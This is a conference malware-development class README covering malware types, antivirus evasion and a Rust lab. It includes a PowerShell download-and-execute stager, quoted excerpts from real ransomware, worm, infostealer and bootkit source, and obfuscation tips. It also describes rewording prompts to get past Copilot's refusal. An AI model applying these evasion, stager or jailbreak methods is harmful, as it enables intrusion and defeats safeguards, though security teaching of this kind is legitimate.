
![ZTW LOGO](/Assets/ThreatLocker_ZTW25_Hacking%20Lab%20github%20logos-03.png)

# Malware Development Class

# About me 

Hello, and welcome to my malware development class. 

My name is Rayton, and I have been involved with technology since middle school. I work as a Threat Analyst at ThreatLocker, focusing on malware and threat research.

[Linkedin](https://www.linkedin.com/in/rayton-li/)

# Table Of Contents 
- [Malware Development Class](#malware-development-class)
- [About me](#about-me)
- [Table Of Contents](#table-of-contents)
- [QR Code](#qr-code)
- [Class Objectives](#class-objectives)
- [! Disclaimer !](#-disclaimer-)
- [Prerequisites](#prerequisites)
- [Understanding Malware](#understanding-malware)
- [Why Make Malware?](#why-make-malware)
- [Which language to use?](#which-language-to-use)
  - [Golang](#golang)
  - [Rust](#rust)
  - [Nim](#nim)
  - [C](#c)
  - [C#](#c-1)
  - [Python](#python)
- [Basic Understanding of Malware Types](#basic-understanding-of-malware-types)
  - [Infostealers](#infostealers)
  - [Stagers / Loaders](#stagers--loaders)
  - [Ransomware](#ransomware)
  - [Trojans](#trojans)
  - [Worms](#worms)
  - [Rootkits](#rootkits)
- [Understanding Kernel Levels](#understanding-kernel-levels)
- [Understanding Windows API calls](#understanding-windows-api-calls)
- [Understanding Anti-Virus Detection](#understanding-anti-virus-detection)
    - [Static/Signature Detection](#staticsignature-detection)
    - [Heuristics Detection](#heuristics-detection)
    - [Behavioral Detection](#behavioral-detection)
- [Techniques of Obfuscation](#techniques-of-obfuscation)
  - [Encoding Strings](#encoding-strings)
  - [Obfustcating The Import Address Table](#obfustcating-the-import-address-table)
  - [Execution Guardrails / Kill Switches](#execution-guardrails--kill-switches)
  - [Certificate Signing](#certificate-signing)
- [AI And Malware](#ai-and-malware)
  - [Example](#example)
  - [Important Note About AI In The Malware Development](#important-note-about-ai-in-the-malware-development)
- [Putting All Of It Together.](#putting-all-of-it-together)
  - [Scenario](#scenario)
  - [Mission](#mission)
  - [Malware Goals](#malware-goals)
  - [What Language To Use?](#what-language-to-use)
  - [Where To Start?](#where-to-start)
  - [Initial Design](#initial-design)
  - [Creating Our First Function / Program](#creating-our-first-function--program)
  - [Lets Compare](#lets-compare)
- [If Time Allows](#if-time-allows)
- [Closing Notes](#closing-notes)
- [Reference Links](#reference-links)

# QR Code 

QR code if you want to save the class for later.  

![QR Code of this class](Assets/qr_code-malware_development.png)

# Class Objectives 

* What is Malware?
* Which language to use?
* Basic Keyloggers, Trojans, Agents. Infostealer
* Evolution of AV
* Obfuscation Techniques
* Using AI in Malware Dev
* Creating Malware


# ! Disclaimer !
Deployment of malware and/or any other harmful script without explicit permission is a violation of the Computer Fraud and Abuse Act.

# Prerequisites 
-  **Basic Understanding of Programming**: Familiarity with programming concepts and experience with at least one programming language.
-  **Laptop**: A personal laptop with internet access, capable of running development tools and virtual machines.
-  **Rust needs to be installed**: This class will be writing in the rust programming language. 
# Understanding Malware
In its most basic form, malware is just software that performs malicious actions. An example would be software that restarts the victim computer when it boots up or causes centrifuges to randomly spin at unsafe speeds.

# Why Make Malware?

Why do I need to know how to make malware? Well, how will you detect or stop malware if you don't know how it works? Besides, if you reverse engineer a piece of malware, how will you understand it without knowing the basics of malware development? (Reverse engineering is a whole other class and will not be covered here.) 

> We all know the real reason is because it seems cool.

# Which language to use?
Just as in software development, selecting the appropriate programming language is crucial for malware development. Each language offers unique features and capabilities that can significantly impact the effectiveness and efficiency of your malware projects. Let’s explore the key differences of several popular programming languages in malware development.


## Golang

**Pros:**

-   **Concurrency**: Built-in support for concurrent programming with goroutines.
-   **Ease of Use**: Simple syntax and easy to learn, which speeds up development.
-   **Static Typing**: Helps catch errors at compile time, increasing reliability.
-   **Cross-Platform**: Compiles to a single binary that can run on multiple platforms.

**Cons:**
-   **Binary Size**: Go binaries can be larger compared to those of other languages.
-   **Limited Libraries**: Fewer libraries compared to more established languages like Python.
-   **Garbage Collection**: Although efficient, it can introduce latency in real-time applications.
-   **Visibility**: Golang binaries can be easier to analyze and reverse-engineer since all the decencies are packaged into one binary.

## Rust

**Pros:**

-   **Memory Safety**: Ownership system prevents common memory errors.
-   **Performance**: Comparable to C and C++, suitable for high-performance tasks.
-   **Concurrency**: Strong support for concurrent programming.
-   **Modern Features**: Includes modern language features like pattern matching and type inference.

**Cons:**

-   **Complexity**: Steeper learning curve due to its strict safety and concurrency features.
-   **Compile Times**: Longer compile times compared to some other languages.
-   **Ecosystem**: Smaller ecosystem and fewer libraries compared to more mature languages.

## Nim

**Pros:**

-   **Performance**: Compiles to C, C++, or JavaScript, offering high performance.
-   **Metaprogramming**: Powerful metaprogramming capabilities for creating flexible malware.
-   **Ease of Use**: Designed to be easy to read and write, speeding up development.
-   **Cross-Platform**: Can target multiple platforms with minimal changes.

**Cons:**
-   **Community**: Smaller community and less support compared to more popular languages.
-   **Tooling**: Less mature tooling and IDE support.
-   **Adoption**: Lower adoption rate, which might limit the availability of resources and libraries.
-   **Detection**: Anti-Virus are very sensitive with nim binary. 

## C

**Pros:**

-   **Low-Level Access**: Direct access to memory and system resources.
-   **Performance**: High performance, crucial for efficient malware.
-   **Portability**: Can be compiled on various platforms.
-   **Control**: Fine-grained control over system resources and hardware.

**Cons:**
-   **Complexity**: Steep learning curve and prone to errors like buffer overflows.

## C#

**Pros:**
-   **Integration with Windows**: Excellent for targeting Windows environments.
-   **Ease of Use**: Easier to write and maintain compared to C or C++.
-   **Rich Libraries**: Extensive .NET framework libraries.
-   **Garbage Collection**: Automatic memory management reduces the risk of memory leaks.

**Cons:**
-   **Platform Dependency**: Primarily designed for Windows, though .NET Core improves cross-platform capabilities.
-   **Performance**: Generally slower than C or C++ due to the overhead of the .NET runtime.
-   **Size**: Larger runtime and dependencies can increase the size of the malware.
## Python

**Pros:**
-   **Ease of Use**: Simple syntax and readability, ideal for rapid development.
-   **Extensive Libraries**: Vast ecosystem of libraries for various functionalities.
-   **Cross-Platform**: Runs on multiple operating systems with minimal changes.

**Cons:**
-   **Performance**: Slower execution speed compared to compiled languages like C or Rust.
-   **Dependency Management**: Managing dependencies can be challenging, especially for cross-platform compatibility.
-   **Visibility**: Python scripts are easier to analyze and reverse-engineer.

# Basic Understanding of Malware Types
Malware has evolved significantly over the past 20 years, transitioning from simple pranks to sophisticated obfuscation programs that operate at specific times. It's important for us to understand the types of malware we might create. The most common types of malware are:

## Infostealers

**Description**: Infostealers are a type of malware designed to collect sensitive information from infected systems. This can include passwords, credit card numbers, personal identification information, and other valuable data.

**Key Characteristics**:
-   **Data Collection**: Targets specific types of data, such as browser history, saved passwords, and system information.
-   **Stealth**: Often operates silently to avoid detection and maximize the amount of data collected.
-   **Exfiltration**: Sends the collected data back to the attacker, usually via the internet.


**Examples**: basic keyloggers, Redline, Lumma, and Raccoon.

This code block is from the redline infostealer in the "userinfohelper.cs" file.
``` C sharp
// This is in C sharp
public static class UserInfoHelper{
    public static List<InstalledBrowserInfo> GetBrowsers()
    {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet"); // <- Check registry key for the default browser.
        if (registryKey == null)
        {
            registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet"); // <- Check this registry key if the other one is not found.
        }
        string[] subKeyNames = registryKey.GetSubKeyNames(); // <- Get the subkeys of the registry key for StartMenuInternet.
        List<InstalledBrowserInfo> list = new List<InstalledBrowserInfo>(); // <- Create a list to store installed browser info.
        for (int i = 0; i < subKeyNames.Length; i++) // <- Loop through each subkey found.
        {
            InstalledBrowserInfo installedBrowserInfo = new InstalledBrowserInfo(); // <- Create a new instance to hold browser info.
            RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]); // <- Open the subkey for the current browser.
            installedBrowserInfo.Name = (string)registryKey2.GetValue(null); // <- Get the browser's name from the default value of the subkey.
            RegistryKey registryKey3 = registryKey2.OpenSubKey("shell\\open\\command"); // <- Open the subkey to get the command used to open the browser.
            installedBrowserInfo.Path = registryKey3.GetValue(null).ToString().StripQuotes(); // <- Get the path to the browser's executable and strip any quotes.
            if (installedBrowserInfo.Path != null)
            {
                installedBrowserInfo.Version = FileVersionInfo.GetVersionInfo(installedBrowserInfo.Path).FileVersion; // <- Get the browser's version if the path is not null.
            }
            else
            {
                installedBrowserInfo.Version = "Unknown Version"; // <- Set the version to "Unknown Version" if the path is null.
            }
            list.Add(installedBrowserInfo); // <- Add the browser info to the list.
        }
        InstalledBrowserInfo edgeVersion = GetEdgeVersion(); // <- Get information about Microsoft Edge, if installed.
        if (edgeVersion != null)
        {
            list.Add(edgeVersion); // <- Add Edge info to the list if found.
        }
        return list; // <- Return the list of installed browsers.
    }
}
```
**Summary** 

The UserInfoHelper class checks the SOFTWARE\WOW6432Node\Clients\StartMenuInternet registry key. If it doesn’t exist, it checks SOFTWARE\Clients\StartMenuInternet. These keys indicate where the default web browser is set. The program then creates a list to document the installed browsers and checks if Edge is also installed, adding it to the list if found.

## Stagers / Loaders
**Description**: Stagers and loaders are types of malware that prepare the environment for the deployment of additional malicious payloads. They are often the first stage in a multi-stage attack.

**Key Characteristics**:
-   **Initial Access**: Gains initial access to the target system, often through phishing or exploiting vulnerabilities.
-   **Payload Delivery**: Downloads and executes additional malware, such as ransomware or trojans.
-   **Persistence**: Ensures that the malware remains on the system even after reboots or attempts to remove it.

  
**Examples**: Emotet, TrickBot.

This is a powershell one line stager.
``` powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.0.2.4:443/mypowershell.ps1')"
```

This will download the content of mypowershell.ps1 into memory and then use Invoke-Expression to execute the content held in the memory. 

## Ransomware
**Description**: Ransomware is a type of malware that encrypts the victim’s files and demands a ransom payment in exchange for the decryption key.

**Key Characteristics**:
-   **Encryption**: Uses strong encryption algorithms to lock files, making them inaccessible to the victim.
-   **Ransom Demand**: Displays a ransom note with instructions on how to pay the ransom, often in cryptocurrency.

**Examples**: WannaCry, Ryuk, LockBit v2.

This code block is from the HelloKitty Ransomware in the "Encryptor.cpp" file
``` C ++
// this in C++
void removeShadows()
{
    IWbemContext *lpContext;
    HRESULT hr = CoCreateInstance(CLSID_WbemContext, nullptr, CLSCTX_INPROC_SERVER, IID_IWbemContext, (LPVOID*)&lpContext); // <- Create a WMI context instance.

    if (SUCCEEDED(hr))
    {
#ifdef _X86_
        if (IsWow64()) // <- Check if the system is run 64 bit. 
        {
            VARIANT vArch;
            VariantInit(&vArch);

            vArch.vt = VT_I4;
            vArch.lVal = 64;

            lpContext->SetValue(L"__ProviderArchitecture", 0, &vArch); // <- Set the provider architecture to 64-bit if running on a 64-bit system.
            VariantClear(&vArch);
        }
#endif
        IWbemLocator *lpLocator; // < Create a WMI locator object>
        if ((SUCCEEDED(CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER | CLSCTX_NO_FAILURE_LOG | CLSCTX_NO_CODE_DOWNLOAD, IID_IWbemLocator, (LPVOID*)&lpLocator))) && (lpLocator))
        {
            IWbemServices *lpService; // Connect to the WMI ROOT\cimv2 namespace
            BSTR bstrRootPath = SysAllocString(L"ROOT\\cimv2");
            if ((SUCCEEDED(lpLocator->ConnectServer(bstrRootPath, nullptr, nullptr, nullptr, NULL, nullptr, lpContext, &lpService))) && (lpService))
            {
                if (SUCCEEDED(CoSetProxyBlanket(lpService, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE))) // check Security Level and set it to allow for impersonation. 
                {
                    IEnumWbemClassObject *lpEnumerator = nullptr;
                    BSTR bstrWql = SysAllocString(L"WQL");
                    BSTR bstrQuery = SysAllocString(L"select * from Win32_ShadowCopy"); // Execute the WMI query for win32_ShadowCopy
                    if (SUCCEEDED(lpService->ExecQuery(bstrWql, bstrQuery , WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &lpEnumerator))) // <- execute the query and check all results.
                    {
                        while (true) // <- Loop though query results  
                        {
                            VARIANT vtProp;
                            IWbemClassObject *pclsObj;
                            ULONG uReturn = 0;
                            lpEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
                            if (!uReturn)
                                break;

                            if ((SUCCEEDED(pclsObj->Get(L"id", 0, &vtProp, nullptr, nullptr))) && (vtProp.vt == VT_BSTR)) // <- check for the shadow copy instance
                            {
                                wchar_t lpStr[128];
                                wsprintfW(lpStr, L"Win32_ShadowCopy.ID='%s'", vtProp.bstrVal); // <- Format the shadow copy ID.
                                if (BSTR str = SysAllocString(lpStr)) {
                                    lpService->DeleteInstance(str, 0, lpContext, nullptr); // <- Delete the shadow copy instance.
                                    SysFreeString(str);
                                }
                                VariantClear(&vtProp);
                            }
                            pclsObj->Release(); // <- CLeaning up and release resources
                            VariantClear(&vtProp);
                        }
                    }
                    SysFreeString(bstrWql);
                    SysFreeString(bstrQuery);// <- CLeaning up and release resources
                }
                SysFreeString(bstrRootPath);// <- CLeaning up and release resources
                lpService->Release();
            }
            lpLocator->Release();// <- CLeaning up and release resources
        }
        lpContext->Release();// <- CLeaning up and release resources
    }
}
```

## Trojans
**Description**: A Trojan, or a Trojan horse, is a type of malware that disguises itself as legitimate software to trick users into installing it. Once installed, it can perform a variety of malicious actions.

**Key Characteristics**:
-   **Deception**: Appears to be a legitimate application or file to deceive users.
-   **Payload**: Can deliver various types of payloads, including backdoors, keyloggers, and ransomware.
-   **Control**: Often provides remote access to the attacker, allowing them to control the infected system.

**Examples**: Zeus, Remote Access Trojans (RATs) like DarkComet.

## Worms
**Description**: Worms are a type of malware that can replicate itself and spread to other systems without user intervention. They often exploit network vulnerabilities to propagate.

**Key Characteristics**:
-   **Self-Replication**: Can create copies of itself and spread to other systems.
-   **Network Propagation**: Exploits network vulnerabilities to move from one system to another.

**Examples**: Blaster, Conficker, Stuxnet.

This code block is from the SingLung worm "SingLung.c" file
``` C++
// This in C++
void GetMail(char *namefile, char *mail)
{
    HANDLE hf, hf2;
    char *mapped;
    DWORD size, i, k;
    BOOL test = FALSE, valid = FALSE;
    mail[0] = 0;

    hf = CreateFile(namefile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, 0); // <- Open the file for reading.
    if (hf == INVALID_HANDLE_VALUE)
        return;
    size = GetFileSize(hf, NULL); // <- Get the size of the file.
    if (!size)
        return;
    if (size < 8)
        return;
    size -= 100; // <- Adjust size to avoid reading the entire file.

    hf2 = CreateFileMapping(hf, 0, PAGE_READONLY, 0, 0, 0); // <- Create a file mapping object.
    if (!hf2) {
        CloseHandle(hf);
        return;
    }

    mapped = (char *)MapViewOfFile(hf2, FILE_MAP_READ, 0, 0, 0); // <- Map the file into the address space of the calling process.
    if (!mapped) {
        CloseHandle(hf2);
        CloseHandle(hf);
        return;
    }

    i = 0;
    while (i < size && !test) {
        if (!strncmpi("mailto:", mapped + i, strlen("mailto:"))) { // <- Look for "mailto:" in the mapped file.
            test = TRUE;
            i += strlen("mailto:");
            k = 0;
            while (mapped[i] != 34 && mapped[i] != 39 && i < size && k < 127) { // <- Read the email address.
                if (mapped[i] != ' ') {
                    mail[k] = mapped[i];
                    k++;
                    if (mapped[i] == '@')
                        valid = TRUE;
                }
                i++;
            }
            mail[k] = 0;
        } else
            i++;
    }

    if (!valid)
        mail[0] = 0; // <- If no valid email found, set mail to empty.
    UnmapViewOfFile(mapped); // <- Unmap the file from the address space.
    CloseHandle(hf2); // <- Close the file mapping object handle.
    CloseHandle(hf); // <- Close the file handle.
    return;
}

void sendmail(char *tos)
{
    memset(&mess, 0, sizeof(MapiMessage));
    memset(&from, 0, sizeof(MapiRecipDesc));

    from.lpszName = NULL;
    from.ulRecipClass = MAPI_ORIG;
    mess.lpszSubject = "Secret for you...";
    mess.lpszNoteText = "Hi Friend,\n\n"
                        "I send you my last work.\n"
                        "Mail me if you have some suggests.\n\n"
                        "    See you soon. Best Regards.";

    mess.lpRecips = (MapiRecipDesc *)malloc(sizeof(MapiRecipDesc)); // <- Allocate memory for recipient info.
    if (!mess.lpRecips)
        return;
    memset(mess.lpRecips, 0, sizeof(MapiRecipDesc));
    mess.lpRecips->lpszName = tos;
    mess.lpRecips->lpszAddress = tos;
    mess.lpRecips->ulRecipClass = MAPI_TO;
    mess.nRecipCount = 1;

    mess.lpFiles = (MapiFileDesc *)malloc(sizeof(MapiFileDesc)); // <- Allocate memory for file attachment info.
    if (!mess.lpFiles)
        return;
    memset(mess.lpFiles, 0, sizeof(MapiFileDesc));
    mess.lpFiles->lpszPathName = filename;
    mess.lpFiles->lpszFileName = "My_Work.exe";
    mess.nFileCount = 1;

    mess.lpOriginator = &from;

    mSendMail(0, 0, &mess, 0, 0); // <- Send the email.

    free(mess.lpRecips); // <- Free the allocated memory for recipient info.
    free(mess.lpFiles); // <- Free the allocated memory for file attachment info.
}

```

## Rootkits
**Description**: A rootkit is a type of malicious software designed to gain unauthorized access to a computer system and maintain that access while hiding their presence. Rootkits can modify the operating system boot order or and software to conceal their activities, making them difficult to detect and remove.

**Key Characteristics**:

-   **Stealth**: Rootkits are designed to hide their presence from users and security software, often by modifying system files and processes.
-   **Persistence**: They can maintain access to the system even after reboots and updates.
-   **Control**: Rootkits provide attackers with remote control over the infected system, allowing them to execute commands, steal data, and install additional malware.

**Examples**: Stuxnet, TDL-4.

This code block is from the BlackLotus bootkit "install.c" file
``` C
// This is in C
BOOL InstallBot()
{
    LPWSTR Path = NULL,
           Directory = NULL,
           Key = NULL,
           Config = NULL;

    if ((Directory = GetBotDirectory()) == NULL) // <- Get the directory where the bot should be installed.
        return FALSE;

    Path = GetBotPath(); // <- Get the path where the bot executable should be copied.
    if (Path != NULL)
    {
        DosPathToNtPath(&Path); // <- Convert DOS path to NT path.
        DosPathToNtPath(&Directory); // <- Convert DOS path to NT path.

        if (FileCreateDirectory(Directory)) // <- Create the directory if it doesn't exist.
        {
            DosPathToNtPath(&g_CurrentProcessPath); // <- Convert the current process path to NT path.
            FileCopy(g_CurrentProcessPath, Path, TRUE); // <- Copy the current process executable to the new path.
            DebugPrintW(L"NzT: Install location: %ls", Path); // <- Print the install location for debugging.
            g_BotInstallPath = Path; // <- Set the global bot install path.
            return TRUE;
        }
    }

    DebugPrintW(L"NzT: Failed to install at :%ls", Path); // <- Print the failure message for debugging.

    return FALSE;
}

```

# Understanding kernel levels

This subject is important. Malware-like boot kits must be on ring 0; others will sit at ring level 3 in the application layer. This is also known as user land.  

![Kenel level](Assets/ring_level.png)

- **Ring 0 (Kernel Mode)**

**Description:** This is the most privileged level, where the operating system kernel runs. It has direct access to all hardware and memory.

Device drivers and core operating system functions operate in Ring 0. If something goes wrong in Ring 0, it can crash the entire system because it has full control over the hardware.

- **Ring 1 and Ring 2 (Driver Mode)**

**Description:** These rings are less privileged than Ring 0 and are typically used for device drivers and other lower-level system functions.

Some operating systems use these rings for specific drivers or services. Modern operating systems often do not use these rings, relying instead on Rings 0 and 3.

- **Ring 3 (User Mode)**

**Description:** This is the least privileged level, where user applications run. It has restricted access to hardware and must request access through system calls to Ring 0.

Web browsers, word processors, and other user applications operate in Ring 3. Errors in Ring 3 are less critical because they do not have direct access to the hardware, making the system more stable and secure.

# Understanding Windows API calls

Now that we know something about the kernel level, the next question is how we interact with the ring zero or kernel level. This is done with Windows API calls, where programs make a system call to the kernel to get something done. For C programs, it is very easy to set a system call. But in languages like Rust or Golang, we must tell the language to run as unsafe, and we have to import the Winapi packages. 

**Example of a system call**

[Microsoft documention on the messageboxw systemcall](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxw)
``` Rust
// This is in Rust
extern crate winapi;

use std::ptr::null_mut;
use winapi::um::winuser::{MessageBoxW, MB_OK}; 

fn main() {
    unsafe {
        MessageBoxW( // <- Create hello world with a MessageBoxW systemcall
            null_mut(), // <- this will be null to set the owner handle to be null
            wide_string("Hello, world!").as_ptr(), // <- This is the main body of the message
            wide_string("Greetings").as_ptr(), // <- this is the title of the message box
            MB_OK,// <- ok Button
        );
    }
}

fn wide_string(value: &str) -> Vec<u16> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    OsStr::new(value).encode_wide().chain(std::iter::once(0)).collect()
}
```

# Understanding Anti-Virus Detection
Understanding how Anti-Virus detects malware is key to making malware. The first thing to know about AVs is that they are going to be in both user land and kernel land. The next things you'll want to know about Anti-Virus Detection, are the detection methods.
### Static/Signature Detection

**Description**: Static or signature-based detection involves scanning files for known patterns or signatures that match a database of known malware. This method is effective against known threats but can be bypassed by modifying the malware’s code.

**Yara**: A tool used to identify and classify malware by creating rules that describe patterns of malicious files. Yara rules can be used to detect specific strings, sequences, or binary patterns within files.

- **Example** 
``` yar
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.
*/
/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-03-24
	Identifier: Petya Ransomware
*/
/* Rule Set ----------------------------------------------------------------- */
rule Petya_Ransomware {
	meta:
		description = "Detects Petya Ransomware"
		author = "Florian Roth"
		reference = "http://www.heise.de/newsticker/meldung/Erpressungs-Trojaner-Petya-riegelt-den-gesamten-Rechner-ab-3150917.html"
		date = "2016-03-24"
		hash = "26b4699a7b9eeb16e76305d843d4ab05e94d43f3201436927e13b3ebafa90739"
	strings:
		$a1 = "<description>WinRAR SFX module</description>" fullword ascii

		$s1 = "BX-Proxy-Manual-Auth" fullword wide
		$s2 = "<!--The ID below indicates application support for Windows 10 -->" fullword ascii
		$s3 = "X-HTTP-Attempts" fullword wide
		$s4 = "@CommandLineMode" fullword wide
		$s5 = "X-Retry-After" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and $a1 and 3 of ($s*)
}

rule Ransom_Petya {
meta:
    description = "Regla para detectar Ransom.Petya con md5 AF2379CC4D607A45AC44D62135FB7015"
    author = "CCN-CERT"
    version = "1.0"
strings:
    $a1 = { C1 C8 14 2B F0 03 F0 2B F0 03 F0 C1 C0 14 03 C2 }
    $a2 = { 46 F7 D8 81 EA 5A 93 F0 12 F7 DF C1 CB 10 81 F6 }
    $a3 = { 0C 88 B9 07 87 C6 C1 C3 01 03 C5 48 81 C3 A3 01 00 00 }
condition:
    all of them
}
```
The points of focus are the **"strings"** and **"conditions"** sections. Yara rules can have mutable rules inside a single rule. In this example, there are two rules for the Petya Ransomware. 

Rule 1 is looking for the first bytes to be `0x5a4d` and the file size need to be least than `500KB` and it needs to have the string `<description>WinRAR SFX module</description>` and it needs any 3 of the following values
```
$s1 = "BX-Proxy-Manual-Auth" fullword wide
$s2 = "<!--The ID below indicates application support for Windows 10 -->" fullword ascii
$s3 = "X-HTTP-Attempts" fullword wide
$s4 = "@CommandLineMode" fullword wide
$s5 = "X-Retry-After" fullword wide
```

Rule 2 is looking for the exact three byte sequences. 
```
$a1 = { C1 C8 14 2B F0 03 F0 2B F0 03 F0 C1 C0 14 03 C2 }
$a2 = { 46 F7 D8 81 EA 5A 93 F0 12 F7 DF C1 CB 10 81 F6 }
$a3 = { 0C 88 B9 07 87 C6 C1 C3 01 03 C5 48 81 C3 A3 01 00 00 }
```
[Yara Rule](https://github.com/Yara-Rules/rules/blob/master/malware/RANSOM_Petya.yar)

### Heuristics Detection

**Description**: Heuristic detection analyzes the structure and behavior of files to identify suspicious characteristics that may indicate malware. This method can detect new or modified malware that does not match known signatures.

**Key Features**:
-   **Code Analysis**: Examines the code for unusual instructions or sequences.
-   **File Structure**: Analyzes the file structure for anomalies that are common in malware.

### Behavioral Detection
**Description**: Behavioral detection monitors the behavior of programs in real-time to identify malicious activities. This method is effective against both known and unknown threats, as it focuses on what the program does rather than its code.
**Key Features**:
-   **System Calls**: Monitors system calls and interactions with the operating system.
-   **Network Activity**: Observes network connections and data transfers.
-   **File Modifications**: Tracks changes to files and directories.

# Techniques of obfuscation
Now that we have a good understanding of how Anti-virus can detect malware. here some ways that we can obfuscate our malware to avoid detection. There are tons of way to obfuscate your malware. I will only covor a few, but you can find more here:

[Malware Behavior Catalog](https://github.com/MBCProject/mbc-markdown/blob/main/)

## Encoding Strings
Encoding Strings is essential when making malware. Having easy strings for the reverse engineer to create a signature for your malware will considerably shorten its life span before it gets flagged by the signature. 

## Obfustcating The Import Address Table 
A great way to hide what import you are using is to obfuscate the import address table. When people are trying to understand the program, most will look at the address table to see what imports are being used. You can create dead code that brings tons of imports to make it very hard to know what's truly being used by the malware.

## Execution Guardrails / Kill Switches
Execution guardrails constrain the execution of malware based on certain conditions or characteristics of the target environment. These conditions can include specific network configurations, hardware characteristics, or software environments. The goal is to ensure that the malware only activates when it detects the expected conditions, thereby avoiding exposure in unintended environments. Some common malware guardrails are 
* Check if the program is be run under a debugger
* Check a domain is registered 
* Check the hostname. 
* Check if its a VM.
* Check if a certain language pack is installed.
* Check its location. 

This is from the BlackLotus boot kit
 ```C
 //This is in C
 #ifndef __ANTIDEBUG_H__
#define __ANTIDEBUG_H__

#include "nzt.h"

BOOL IsBeingDebuggedAlt(); // <- Check if the IsBeingDebugged flag is set in the Process Environment Block (PEB)
WINERROR IsBeingDebugged(); // <- errors if the the IsBeingDebugged flag is true

#endif //__ANTIDEBUG_H__
```

## Certificate Signing
The simplest way to help our malware from being detect by an antivirus is to code-sign the binary. Since most programs are signed, we must do the same with our malware. We will not cover code signing in this course, but there are many other places to learn how to code-sign a binary.  


# AI And Malware
AI is inescapable now, even in this class. However, I will keep it short. AI offers significant advantages in malware development. AI can be incredibly useful, especially when unsure where to start. Now, most AI models won't let you just ask it to create malware, but you can outsmart the model. 

## Example
When we ask it to create malware, you will get something like No, it's not allowed to do that. 

![Copilot don't like the word malware](Assets/Copilot%20blocked.png)

But if we word the prompt better, we can get the model to output what we need.

![Copilot loves programing](Assets/Copilot%20allow.png)

If you want to learn more about prompt injection, you can let me know. 

> As I was writing this exact part of the class, the bleeping computer release this article  [Bleeping computer Link for Time bandit](https://www.bleepingcomputer.com/news/security/time-bandit-chatgpt-jailbreak-bypasses-safeguards-on-sensitive-topics/)

## Important Note About AI In The Malware Development

If you ever had a small child who tries to help you with a project, they try their best. But it's a bit off. That is what AI does with any software development prompt. Be ready to update the code since it might use old dependencies. 

Example

AI 
``` Rust
fn check_domain(domain: &str) {
    match (domain, 80).to_socket_addrs() { // <- This tries to use the socket crate to connect to port 80.
        Ok(_) => println!("Domain resolved successfully."),
        Err(_) => {
            eprintln!("Failed to resolve domain.");
            process::exit(1);
        }
    }
}
```

Ours 
``` rust
fn resolve_domain_name(domain: &str) -> Result<Vec<IpAddr>, String> { // <- This uses the DNS lookup crate. This just does a nslookup
    match lookup_host(domain) {
        Ok(ips) => Ok(ips),
        Err(e) => Err(format!("Failed to resolve domain {}: {}", domain, e)),
    }
}
```
# Putting All Of It Together.

## Scenario 
You are part of a state-sponsored cyber espionage team which called "Summer Ducks" tasked with gaining access to sensitive data from a foreign government agency.

## Mission
Your team has identified an easy target: a defense company of a neighboring country. The goal is to obtain intelligence on their latest defense strategies and technological advancements. Our other team had access to an IT admin account from an infostealer campaign a month prior. This gives us access to the RMM (Remote Monitoring and Management) tool, but during the reconnaissance we found out that they are using windows computers. and the way this company does its security; an alert will be generated when our account accesses sensitive files. The account may also be terminated for some reason. 

## Malware Goals
* Needs to have prescience access
* Needs to have encrypted communication 
* Needs a kill switch for when the operation is complete. 
* Needs to have the primary payload hidden 
* Can't have external decencies. 
* Needs to blend in the environment.

## What Language To Use? 
We will use Rust because it is very similar to C and doesn't require manual memory management. However, we could also use Nim or Golang. 

## Where To Start?
The first thing to do is how we are going to blend in the environment. Since we have an IT admin account with access to an RMM tool, it would not be unusual if an IT admin deployed backup software. This allows us to skip out the need to make a loader or stager to deliver malware to the target. And if we use existing tools like Rclone or other tools. It would raise some flags as to why open-source tools are being used on the network. Since this is a government agency, they would have a lot of custom software tools. This makes it a perfect place for our malware. 

## Initial Design
Now, there might not be time to create every function in this class, so what we will do is that I want you to make a rouge line of what function you think you will need, and after some time, I will show what my design looked like when I started. 

**My initial design**
- Encrypts and decryption function to hide any hard code strings to stop static analyze of strings.
- Check-in function to get command from a remote location.
- An uninstall function when we need to delete the program
- An install function to hide the malware
- Check and create a registry key to start on boot up
- Grandrails to stop if it don't have internet and is being debugged

## Creating Our First Function / Program 
This where you will create your first malware. Note you can use AI. 
1. Open the win10victim VM
2. Open VScode
3. Go to the file button on the top left of VScode
4. Click on the open folder.
5. Navigate to the `C:\user\admin\Desktop\"Rust malware"\malware` and select the malware folder.
6. There should be a Hello World program there for you to play with. 
7. Try making something. 
> To run all you have to do is open a terminal and run `cargo run`

## Lets Compare
If we go to the program that Rayton/ Nick and compare the one you made and the one that they made. 

**Bin**

- [Main](Malware/src/bin/c2-agent.rs)
- [Support encryptor](Malware/src/bin/encryptor.rs)
  
**Global code**

- [Command engine function](Malware/src/command_engine.rs)
- [Encryption functions](Malware/src/encryption.rs)
- [setting glocal functions](Malware/src/lib.rs)
- [Getting Systeminfo function](Malware/src/systeminfo.rs)

**Lib**
- [All Crate used](Malware/Cargo.lock)
- [Crate configuration file](Malware/Cargo.toml)

**Precomplied malware**
- [Precomplied malware](Malware/Precomplied.rar)

> Password for the precomplied malware is `infected`

# If Time Allows
If there is still time then, We will be going over things in the offensive rust project and exploring. - [Offensives Rust](https://github.com/trickster0/OffensiveRust)

# Closing Notes
```
I hope you gained valuable insights and now have a better understanding of malware development. Thank you for attending ZTW 2025. I look forward to seeing you next time!

Best regards,
Ray
``` 

# Reference Links
This is a list of all the links used in the class. There are also some helpful links for topics not covered in this class.   

